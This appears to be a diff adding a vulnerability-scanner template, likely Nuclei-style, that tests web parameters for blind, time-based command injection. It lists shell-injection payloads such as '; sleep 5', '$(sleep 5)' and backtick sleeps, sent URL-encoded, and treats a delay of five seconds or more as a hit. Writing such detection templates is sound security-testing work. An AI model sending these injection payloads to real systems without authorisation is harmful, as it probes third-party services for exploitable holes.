@@ -1,0 +1,37 @@
+# templates/command-injection/command-injection-blind.yaml
+id: command-injection-blind
+info:
+  name: Blind Command Injection (Time-based)
+  author: shadowxp
+  severity: high
+  description: Tests for blind command injection using time delays
+  tags:
+    - command-injection
+    - blind
+    - time-based
+
+vulnerability_type: command-injection
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{command_payload}}"
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=5"
+
+payloads:
+  # Time-based payloads
+  - "sleep 5"
+  - "ping -c 5 127.0.0.1"
+  - "timeout 5"
+  - "; sleep 5"
+  - "| sleep 5"
+  - "&& sleep 5"
+  - "$(sleep 5)"
+  - "`sleep 5`"
+
+encoders:
+  - url
+  - double_url
